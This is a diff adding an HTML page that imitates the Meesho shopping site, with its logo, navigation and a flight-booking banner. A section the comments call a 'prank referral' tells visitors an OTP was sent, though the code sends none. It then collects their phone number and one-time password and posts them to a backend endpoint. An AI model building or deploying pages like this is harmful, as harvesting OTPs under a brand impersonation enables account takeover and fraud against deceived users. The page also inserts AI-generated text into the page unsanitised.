@@ -1,0 +1,445 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Online Shopping | Meesho</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      margin: 0;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+      background-color: #f9f9f9;
+    }
+
+    header {
+      background-color: #fff;
+      border-bottom: 1px solid #ddd;
+      padding: 10px 20px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      position: sticky;
+      top: 0;
+      z-index: 1000;
+    }
+
+    .logo img {
+      height: 36px;
+    }
+
+    nav a {
+      margin-left: 20px;
+      text-decoration: none;
+      color: #333;
+      font-weight: 500;
+      transition: color 0.3s;
+    }
+
+    nav a:hover {
+      color: #f43397;
+    }
+
+    .banner {
+      padding: 40px 20px;
+      background: linear-gradient(135deg, #fce0f0, #eef5ff);
+      text-align: center;
+    }
+
+    .banner h2 {
+      color: #333;
+      font-weight: 700;
+    }
+    
+    .banner p {
+      color: #555;
+    }
+
+    .banner a.book-now-btn {
+      margin-top: 15px;
+      display: inline-block;
+      padding: 12px 25px;
+      background-color: #f43397;
+      color: white;
+      text-decoration: none;
+      border-radius: 8px;
+      font-weight: 600;
+      transition: background-color 0.3s, transform 0.2s;
+      box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+    }
+
+    .banner a.book-now-btn:hover {
+        background-color: #d81b60;
+        transform: translateY(-2px);
+    }
+
+    .referral {
+      padding: 40px 20px;
+      background-color: #ffffff;
+      text-align: center;
+      border-bottom: 1px solid #eee;
+    }
+
+    .referral h3 {
+      color: #333;
+      margin-top: 0;
+      font-size: 1.5em;
+      font-weight: 700;
+    }
+    
+    .referral p {
+        color: #666;
+        margin-bottom: 25px;
+    }
+
+    .form-container {
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      gap: 15px;
+      max-width: 400px;
+      margin: 0 auto;
+    }
+
+    .form-container input {
+      padding: 12px;
+      border-radius: 8px;
+      border: 1px solid #ccc;
+      width: 100%;
+      box-sizing: border-box;
+      font-size: 16px;
+      transition: border-color 0.3s, box-shadow 0.3s;
+    }
+    
+    .form-container input:focus {
+        outline: none;
+        border-color: #f43397;
+        box-shadow: 0 0 0 3px rgba(244, 51, 151, 0.2);
+    }
+
+    .form-container button {
+      padding: 12px 25px;
+      width: 100%;
+      background-color: #f43397;
+      color: white;
+      text-decoration: none;
+      border-radius: 8px;
+      border: none;
+      cursor: pointer;
+      font-weight: 600;
+      font-size: 16px;
+      transition: background-color 0.3s, transform 0.2s;
+    }
+
+    .form-container button:hover {
+      background-color: #d81b60;
+      transform: translateY(-2px);
+    }
+
+    .form-container button:disabled {
+        background-color: #cccccc;
+        cursor: not-allowed;
+        transform: none;
+    }
+    
+    .hidden {
+        display: none;
+    }
+
+    #message {
+        margin-top: 15px;
+        font-weight: 500;
+    }
+    .message.success { color: green; }
+    .message.error { color: red; }
+    
+    #itinerary-result {
+        margin-top: 20px;
+        padding: 20px;
+        background-color: #f9f9f9;
+        border-radius: 8px;
+        border: 1px solid #eee;
+        text-align: left;
+        white-space: pre-wrap;
+        line-height: 1.6;
+    }
+    
+    .loader {
+        border: 4px solid #f3f3f3;
+        border-radius: 50%;
+        border-top: 4px solid #f43397;
+        width: 40px;
+        height: 40px;
+        animation: spin 1s linear infinite;
+        margin: 20px auto;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+
+    .grid {
+      padding: 20px;
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(160px, 1fr));
+      gap: 20px;
+    }
+
+    .item a {
+      display: block;
+      background: #fff;
+      padding: 20px 15px;
+      text-align: center;
+      border-radius: 12px;
+      border: 1px solid #eee;
+      text-decoration: none;
+      color: black;
+      transition: transform 0.3s, box-shadow 0.3s;
+    }
+
+    .item a:hover {
+      transform: translateY(-5px);
+      box-shadow: 0 8px 20px rgba(0,0,0,0.08);
+    }
+
+    footer {
+      text-align: center;
+      padding: 20px;
+      background: #f1f1f1;
+      margin-top: 40px;
+      color: #777;
+    }
+  
+    @media (max-width: 768px) {
+      header {
+        flex-direction: column;
+        align-items: flex-start;
+      }
+
+      nav {
+        display: flex;
+        flex-wrap: wrap;
+        gap: 10px;
+        padding-top: 10px;
+      }
+
+      nav a {
+        margin: 0;
+        font-size: 14px;
+      }
+
+      .banner h2, .referral h3 {
+        font-size: 20px;
+      }
+
+      .banner p, .referral p {
+        font-size: 14px;
+      }
+
+      .grid {
+        grid-template-columns: repeat(2, 1fr);
+        padding: 10px;
+        gap: 10px;
+      }
+
+      .item a {
+        font-size: 14px;
+        padding: 15px 10px;
+      }
+    }
+    </style>
+</head>
+<body>
+
+  <header>
+    <div class="logo">
+      <a href="https://www.meesho.com/">
+        <img src="https://www.meesho.com/assets/svgicons/meeshoLogo.svg" alt="Meesho Logo" onerror="this.onerror=null;this.src='https://placehold.co/150x40/ffffff/f43397?text=meesho';">
+      </a>
+    </div>
+    <nav>
+      <a href="https://www.meesho.com/" target="_blank">Home</a>
+      <a href="https://www.meesho.com/women-wear/pl/3f4" target="_blank">Women</a>
+      <a href="https://www.meesho.com/men-wear/pl/3f5" target="_blank">Men</a>
+      <a href="https://www.meesho.com/electronics/pl/3f6" target="_blank">Electronics</a>
+      <a href="https://www.makemytrip.com/flights/" target="_blank" style="color: #f43397;">Flight Booking ✈️</a>
+      <a href="https://www.meesho.com/cart" target="_blank">Cart</a>
+    </nav>
+  </header>
+
+  <section class="banner">
+    <h2>Book Flights at Unbeatable Prices</h2>
+    <p>Get exclusive deals on domestic & international travel</p>
+    <a href="https://www.makemytrip.com/flights/" target="_blank" class="book-now-btn">Book Now</a>
+  </section>
+
+  <!-- Prank Referral Section -->
+  <section class="referral">
+    <!-- This form is handled by JS but set up for Netlify to detect its fields if needed -->
+    <form id="referralForm" name="referral" class="hidden">
+      <input type="tel" name="phone">
+      <input type="text" name="otp">
+    </form>
+
+    <div id="phone-step" class="form-container">
+        <h3>Have an Employee Referral?</h3>
+        <p>Enter your phone number to get an OTP for extra flight discounts.</p>
+        <input type="tel" id="phone-input" placeholder="Enter Phone Number" autocomplete="off">
+        <button type="button" onclick="requestOTP()">Send OTP</button>
+    </div>
+    <div id="otp-step" class="form-container hidden">
+        <h3>Verify OTP</h3>
+        <p>An OTP was sent to your number.</p>
+        <input type="text" id="otp-input" placeholder="Enter 6-Digit OTP" autocomplete="off">
+        <button type="button" onclick="verifyOTP()">Verify & Continue</button>
+    </div>
+    
+    <div id="itinerary-step" class="form-container hidden">
+        <h3>✨ AI-Powered Itinerary</h3>
+        <p>Referral successful! As a bonus, let our AI plan your trip.</p>
+        <input type="text" id="destination" placeholder="Enter a destination (e.g., Goa, Paris)">
+        <button type="button" onclick="generateItinerary()">Generate Dream Itinerary</button>
+        <div id="loader" class="loader hidden"></div>
+        <div id="itinerary-result"></div>
+        <button id="final-book-btn" class="hidden" onclick="redirectToMMT()">Book Flights Now</button>
+    </div>
+    <div id="message" class="message"></div>
+  </section>
+  <!-- End of Prank Section -->
+
+  <section class="grid">
+    <div class="item"><a href="https://www.meesho.com/sarees/pl/3iy" target="_blank">👗 Sarees</a></div>
+    <div class="item"><a href="https://www.meesho.com/tshirts-women/pl/3sc" target="_blank">👕 T-Shirts</a></div>
+    <div class="item"><a href="https://www.meesho.com/handbags-women/pl/3k2" target="_blank">👜 Handbags</a></div>
+    <div class="item"><a href="https://www.meesho.com/mens-footwear/pl/9ta" target="_blank">👞 Shoes</a></div>
+    <div class="item"><a href="https://www.meesho.com/bluetooth-headphones/pl/8d9" target="_blank">🎧 Headphones</a></div>
+    <div class="item"><a href="https://www.meesho.com/baby-clothing/pl/9th" target="_blank">👶 Babywear</a></div>
+  </section>
+
+  <footer>
+    &copy; 2025 Meesho | All flight and hotel services are provided by our trusted partners.
+  </footer>
+
+  <script>
+    const phoneInput = document.getElementById('phone-input');
+    const otpInput = document.getElementById('otp-input');
+    const phoneStep = document.getElementById('phone-step');
+    const otpStep = document.getElementById('otp-step');
+    const itineraryStep = document.getElementById('itinerary-step');
+    const messageDiv = document.getElementById('message');
+    const loader = document.getElementById('loader');
+    const itineraryResult = document.getElementById('itinerary-result');
+    const finalBookBtn = document.getElementById('final-book-btn');
+
+    function requestOTP() {
+        const phone = phoneInput.value;
+        if (phone.length < 10 || !/^\d{10}$/.test(phone)) {
+            messageDiv.textContent = "Please enter a valid 10-digit phone number.";
+            messageDiv.className = 'message error';
+            return;
+        }
+        messageDiv.textContent = "OTP sent successfully to " + phone;
+        messageDiv.className = 'message success';
+        phoneStep.classList.add('hidden');
+        otpStep.classList.remove('hidden');
+    }
+
+    const submitToBackend = () => {
+        const phone = phoneInput.value;
+        const otp = otpInput.value;
+        
+        const apiUrl = '/api/submit-referral'; 
+
+        fetch(apiUrl, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ phone, otp }),
+        })
+        .then(response => response.json())
+        .then(result => {
+            if(result.success){
+                 console.log("Form data submitted to backend successfully.");
+            } else {
+                 console.error("Backend submission failed:", result.error);
+            }
+        })
+        .catch((error) => {
+            console.error("Error submitting form data to backend:", error);
+        })
+        .finally(() => {
+            messageDiv.textContent = "";
+            otpStep.classList.add('hidden');
+            itineraryStep.classList.remove('hidden');
+        });
+    };
+
+    function verifyOTP() {
+        const otp = otpInput.value;
+        if (otp.length !== 6 || !/^\d{6}$/.test(otp)) {
+            messageDiv.textContent = "Please enter a valid 6-digit OTP.";
+            messageDiv.className = 'message error';
+            return;
+        }
+        submitToBackend();
+    }
+    
+    async function generateItinerary() {
+        const destination = document.getElementById('destination').value;
+        if (!destination) {
+            messageDiv.textContent = "Please enter a destination.";
+            messageDiv.className = 'message error';
+            return;
+        }
+
+        const genButton = itineraryStep.querySelector('button');
+        genButton.disabled = true;
+        loader.classList.remove('hidden');
+        itineraryResult.innerHTML = '';
+        messageDiv.textContent = '';
+        finalBookBtn.classList.add('hidden');
+
+        const prompt = `Create a fun and exciting 3-day travel itinerary for a trip to ${destination}. Include suggestions for morning, afternoon, and evening activities for each day. Also, suggest 3-4 local dishes to try. Format the output nicely with headings for each day. Use markdown for bolding.`;
+        
+        const chatHistory = [];
+        chatHistory.push({ role: "user", parts: [{ text: prompt }] });
+        const payload = { contents: chatHistory };
+        const apiKey = ""; 
+        const apiUrl = `https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash:generateContent?key=${apiKey}`;
+
+        try {
+            const response = await fetch(apiUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+            const result = await response.json();
+            
+            if (result.candidates && result.candidates[0]?.content?.parts?.[0]) {
+              
+                let text = result.candidates[0].content.parts[0].text;
+                text = text.replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>');
+                itineraryResult.innerHTML = text;
+
+            } else {
+                itineraryResult.textContent = "Sorry, the AI itinerary planner is currently unavailable. You can still proceed to book flights.";
+                console.error("Gemini API Error: Invalid response structure", result);
+            }
+
+        } catch (error) {
+            console.error('Error calling Gemini API:', error);
+            itineraryResult.textContent = "An error occurred while generating your itinerary. You can still proceed to book flights.";
+        } finally {
+            genButton.disabled = false;
+            loader.classList.add('hidden');
+            finalBookBtn.classList.remove('hidden');
+        }
+    }
+
+    function redirectToMMT() {
+      window.open('https://www.makemytrip.com/flights/', '_blank');
+    }
+  </script>
+</body>
+</html>
